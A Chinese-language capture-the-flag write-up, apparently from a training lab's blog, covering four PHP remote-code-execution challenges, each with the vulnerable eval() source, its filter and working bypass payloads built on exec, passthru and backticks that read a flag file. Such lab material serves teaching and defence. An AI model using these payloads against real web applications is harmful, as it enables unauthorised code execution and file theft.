#  禁了 system 就安全？六边形靶场 RCE 上篇：从 exec 打到反引号  
原创 网安布道师
                    网安布道师  六边形攻防安全   2026-07-12 12:26  
  
> ❝  
> 六边形攻防靶场 Web → Rce 系列 · 共三篇  
  
上篇：4 道命令执行函数基础题，把“能执行”这件事先跑通。  
> ❞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FaZFJ7xrqJY1m0LauaKbickrTiayK3zgP3cyTzibZQ6htHQuNh0OpSlLeqnohX2NHmgz85x8VpRg3NZJ0TemViccRwZovL6HWNvU2cTZibuod68Y/640?wx_fmt=png&from=appmsg "")  
  
远程命令执行（Remote Code Execution，RCE）最危险的地方，不只是“能执行一条命令”，而是攻击者可能借此读取敏感文件、控制业务进程，甚至把 Web 漏洞扩展为主机失陷。  
  
这套系列来自我们自己六边形攻防靶场。进入 **「题库 → Web → Rce」**  
，按题名搜索即可找到对应题目。本文只讨论靶场中的合法练习，请勿把 Payload 用于未授权目标。  
## 系列导读  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">篇目</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">覆盖题目</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">主线</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">上（本文）</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">rce-cmdfunction1</span></code><section><span leaf=""> ~ </span><code><span leaf="">rce-cmdfunction4</span></code></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">执行入口：函数与反引号</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">中</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">disable_functions</span></code><section><span leaf=""> / 分隔符 / 空格</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">从“能执行”到“能拼语法”</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">下</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">敏感词 / 无回显 / 斜线 / 长度限制</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">更刁钻的过滤与最短命令</span></section></td></tr></tbody></table>  
  
本系列共 **「13 道题」**  
。建议按顺序刷。  
  
**「每题阅读顺序（后文统一）」**  
：源码/环境 → 过滤点 → 绕过思路 → Payload → 结果 → 小结。  
## 开打之前：RCE 基础速查  
  
这里的 RCE 主要指 **「Web 里触发的操作系统命令执行」**  
（本篇重点）。  
  
另有一类是 PHP **「代码执行」**  
（如 eval  
），中篇 disable_functions  
 题会碰到「不跑 shell、只读文件」的思路。  
### PHP 常见外部命令接口  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">方式</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">是否自动输出</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">返回值特点</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">system($cmd)</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">是，直接打印命令输出</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">返回输出的</span><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「最后一行」</span></strong></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">exec($cmd)</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">否</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">默认只返回最后一行；第 2 个参数 </span><code><span leaf="">$output</span></code><span leaf=""> 可收</span><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「逐行数组」</span></strong><span leaf="">（常用 </span><code><span leaf="">var_dump</span></code><span leaf=""> / </span><code><span leaf="">print_r</span></code><span leaf=""> 打印）</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">shell_exec($cmd)</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">否</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">返回</span><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「完整」</span></strong><span leaf="">输出字符串；应用不 </span><code><span leaf="">echo</span></code><span leaf=""> 就等于无回显</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">passthru($cmd)</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">是，原样输出（含二进制）</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">一般不靠返回值拿文本</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">反引号 </span><code><span leaf="">`$cmd`</span></code></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">否</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">语义接近 </span><code><span leaf="">shell_exec()</span></code></section></td></tr></tbody></table>  
> ❝  
> 在 Linux 上，上述接口多数会经 shell 解析，所以后面的分隔符、空格、通配符过滤才有意义。  
> ❞  
  
### 命令连接 / 调度（过滤常 ban 这些）  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">符号</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">含义</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">;</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">顺序执行，前后都跑</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">&amp;&amp;</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">前一条</span><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「成功」</span></strong><span leaf="">才执行后一条</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">||</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">前一条</span><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「失败」</span></strong><span leaf="">才执行后一条</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">|</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">管道：前一条 stdout → 后一条 stdin</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">&amp;</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">后台执行（过滤里也常当连接符处理）</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">换行（</span><code><span leaf="">%0a</span></code><span leaf=""> 等）</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">有时可当「下一条命令」的结束/分隔</span></section></td></tr></tbody></table>  
### Shell 通配（glob）  
- *  
：当前路径分段内，匹配任意长度（含空），**「通常不跨 /」**  
  
- ?  
：匹配**「恰好一个」**  
字符  
  
- [a-z]  
 / [0-9]  
：匹配范围内**「一个」**  
字符  
  
中下篇还会用到：>name  
 创建空文件；目录里单独执行 *  
 时，**「字典序第一个文件名会当命令、其余当参数」**  
。  
  
**「先分清：函数有没有把结果打到页面上，以及返回值是「一行」还是「整段」。」**  
  
很多「命令跑了但页面空白」的坑，都出在这里。  
## 第一题：rce-cmdfunction1  
  
**「平台路径」**  
：题库 → Web → Rce → rce-cmdfunction1  
**「难度」**  
：easy · 分值 31  
### 源码 / 环境分析  
  
打开题目后，首页大致是：  
```
<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];
    eval($code);
} else {
    highlight_file(__FILE__);
}
?>
```  
  
要点：  
1. 用户输入经 eval()**「直接当 PHP 代码执行」**  
（代码执行入口）  
  
1. 同目录常有 phpinfo.php  
，可看 disable_functions  
  
1. 实机上 system  
 在禁用列表里，但 **「exec 仍可用」**  
  
### 过滤点  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">disable_functions</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">禁了 </span><code><span leaf="">system()</span></code><span leaf="">，未封死全部命令执行</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">exec</span></code><section><span leaf=""> 的返回值</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">默认只返回输出</span><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「最后一行」</span></strong><span leaf="">，不自动打印整段</span></section></td></tr></tbody></table>  
  
exec  
 的函数原型大致是：  
```
exec(string $command, array &$output = null, int &$result_code = null): string|false|null
```  
- 不传第 2 个参数：只拿到最后一行字符串  
  
- 传入 $output  
：每一行进数组，再用 var_dump  
 / print_r  
 打出  
  
### 绕过思路  
1. 不用被 ban 的 system  
，改用 exec  
  
1. 用第二参数接完整输出，再 var_dump  
 打印  
  
1. 先 ls  
 / ls /  
 定位，再 cat /flag  
 或 cat /fl*  
  
### Payload  
```
?code=exec('ls',$output);var_dump($output);
?code=exec('cat /flag',$o);var_dump($o);
```  
### 结果  
  
  
rce-cmdfunction1  
 运行结果  
  
图：地址栏 URL 含 exec + var_dump Payload，页面数组回显 Flag。  
### 本题小结  
  
看到某个危险函数被禁用时，不要立刻下结论。应同时检查：同类函数、返回值是否被输出、函数是否有额外输出参数。  
## 第二题：rce-cmdfunction2  
  
**「平台路径」**  
：题库 → Web → Rce → rce-cmdfunction2  
**「难度」**  
：easy · 分值 32  
### 源码 / 环境分析  
  
入口形态与第一题同类，仍是把用户输入送进代码执行：  
```
<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];
    eval($code);
} else {
    highlight_file(__FILE__);
}
?>
```  
  
环境继续收紧可用的命令执行函数，但 **「passthru() 仍可用」**  
。  
### 过滤点  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">函数黑名单（部分）</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">常见 </span><code><span leaf="">system</span></code><span leaf=""> 等不可用</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">漏项</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">passthru</span></code><section><span leaf=""> 仍在</span></section></td></tr></tbody></table>  
  
passthru  
 与 exec  
 的差异：  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">函数</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">行为</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">exec</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">偏返回值；完整输出靠第 2 参数</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">passthru</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><strong style="color: #3594F7;font-weight: bold;"><span leaf="">「直接」</span></strong><section><span leaf="">把命令原始输出打进响应</span></section></td></tr></tbody></table>  
### 绕过思路  
  
全程用 passthru  
：确认执行 → 枚举 → 读 Flag。  
### Payload  
```
?code=passthru('ls');
?code=passthru('ls /');
?code=passthru('cat /flag');
?code=passthru('cat /fl*');
```  
### 结果  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FaZFJ7xrqJaO8diaib7T68UFnaw8Atvfl0zFibU4BhanfFUf3ZTAJHuYsHSn615vr1d1QVsXPaRtWKhibhBTOic58NYeZVmCXyib5mibticAsnYRqkw/640?wx_fmt=png&from=appmsg "")  
  
rce-cmdfunction2  
 运行结果  
  
图：地址栏 URL 含 passthru('cat /flag')，页面直接回显 Flag。  
### 本题小结  
  
仅按函数名做黑名单很难覆盖全部执行接口。不要假设“禁掉 system  
 就安全了”。  
## 第三题：rce-cmdfunction3  
  
**「平台路径」**  
：题库 → Web → Rce → rce-cmdfunction3  
**「难度」**  
：easy · 分值 33  
### 源码 / 环境分析  
  
入口仍是：  
```
<?php
if (isset($_GET['code'])) {
    eval($_GET['code']);
} else {
    highlight_file(__FILE__);
}
?>
```  
  
前两题对抗的是「换哪个函数」；本题要意识到 PHP 还有**「不以函数调用形式出现」**  
的执行能力。  
### 过滤点  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">函数名层面</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">常见命令函数可被禁用/过滤</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">未覆盖</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">反引号<span textstyle="" style="color: rgb(255, 76, 0);">执行运算符</span> </span><code><span leaf="">`cmd`</span></code></section></td></tr></tbody></table>  
  
语义近似：  
```
echo shell_exec('ls');
// 与
echo `ls`;
```  
### 绕过思路  
  
把命令放进反引号，外层 echo  
 把返回字符串打到页面。  
### Payload  
```
?code=echo `ls`;
?code=echo `ls /`;
?code=echo `cat /flag`;
?code=echo `cat /fl*`;
```  
> ❝  
> 反引号不是单引号。URL 中常编码为 %60  
。  
> ❞  
  
### 结果  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FaZFJ7xrqJbYOSNRT6Hf6uNic9vxsbdJdwYF2NEeRkVf17ahicHicPtyJeVvfgIZe1Go9yBDG6e07zNWJqoclXzgK5RylIcE2cpWS9IyhOt6ws/640?wx_fmt=png&from=appmsg "")  
  
rce-cmdfunction3  
 运行结果  
  
图：地址栏 URL 含 echo \cat /flag``，页面回显 Flag。  
### 本题小结  
  
代码审计不能只搜 system  
、exec  
。反引号、危险回调、动态包含等也要进检查清单。  
## 第四题：rce-cmdfunction4  
  
**「平台路径」**  
：题库 → Web → Rce → rce-cmdfunction4  
**「难度」**  
：easy · 分值 34  
### 源码 / 环境分析  
  
本题在 eval  
 前加了形态校验，核心逻辑接近：  
```
<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];
    // 只允许 echo(……); 且括号内很短
    if (';' === preg_replace('/echo\(.{0,10}\)/', '', $code)) {
        echo 123;
        eval($code);
    } else {
        echo "NoNoNo!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
```  
### 过滤点  
  
从源码可直接读出：  
1. 整体必须能被 echo(.{0,10})  
 匹配掉，最后只剩 ;  
  
1. 即形态为：echo(……);  
，且**「括号内最多约 10 个字符」**  
  
1. 校验通过会先 echo 123  
，再 eval  
  
1. echo(\  
cat /flag`);括号内过长 →  
NoNoNo!!!`  
  
### 绕过思路  
1. 外层满足 echo(...);  
  
1. 括号内用反引号执行命令  
  
1. 路径用 /fl*  
 压缩，卡进 10 字符限制  
  
### Payload  
```
?code=echo(`cat /fl*`);
```  
### 结果  
  
页面常见回显：123  
 + Flag 内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FaZFJ7xrqJYOGVr8JG7eqM49vLicIicqGbJdr1NOD9QIWCkVNUmsicNZxepABlxlq7nVNvbGLmJdZdiawR5YWhjd3Lico7grwqicT6lDlRibFAQIaI/640?wx_fmt=png&from=appmsg "")  
  
rce-cmdfunction4  
 运行结果  
  
图：地址栏 URL 含 echo(\cat /fl  
`);，页面出现  
123` 与 Flag。*  
### 本题小结  
  
长度限制不等于安全边界。Shell 通配会在执行前展开很短的输入。  
## 上篇总结  
  
四道题统一练的是：  
1. **「先看源码」**  
：输入进了 eval  
 还是 system  
？有没有正则/长度？  
  
1. **「再列过滤点」**  
：禁了谁、漏了谁、返回值会不会显示？  
  
1. **「再写绕过」**  
：换函数 / 换运算符 / 用通配压缩  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">题目</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">源码关键点</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">突破</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">rce-cmdfunction1</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">eval</span></code><section><span leaf=""> + </span><code><span leaf="">disable_functions</span></code></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">exec</span></code><section><span leaf=""> 第二参数 + </span><code><span leaf="">var_dump</span></code></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">rce-cmdfunction2</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">eval</span></code><section><span leaf=""> + 函数黑名单</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">passthru</span></code><section><span leaf=""> 直出</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">rce-cmdfunction3</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">eval</span></code><section><span leaf=""> + 函数黑名单</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><section><span leaf="">反引号</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">rce-cmdfunction4</span></code></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">echo(.{0,10})</span></code><section><span leaf=""> 形态限制</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;min-width: 85px;"><code><span leaf="">echo(\</span></code><section><span leaf="">cat /fl*`);`</span></section></td></tr></tbody></table>  
  
下一篇：disable_functions  
、分隔符、空格——继续先啃源码再绕。  
## 去哪练？  
  
**靶场注册：公众号回复【靶场邀请码】获取邀请码即可进行注册**  
  
打开 https://hexlab.fun/ → **「题库 → Web → Rce」**  
  
建议：先独立做，再回看文章复盘。  
  
关注 **「六边形攻防安全」**  
，中篇见：黑名单、分隔符与空格。  
  
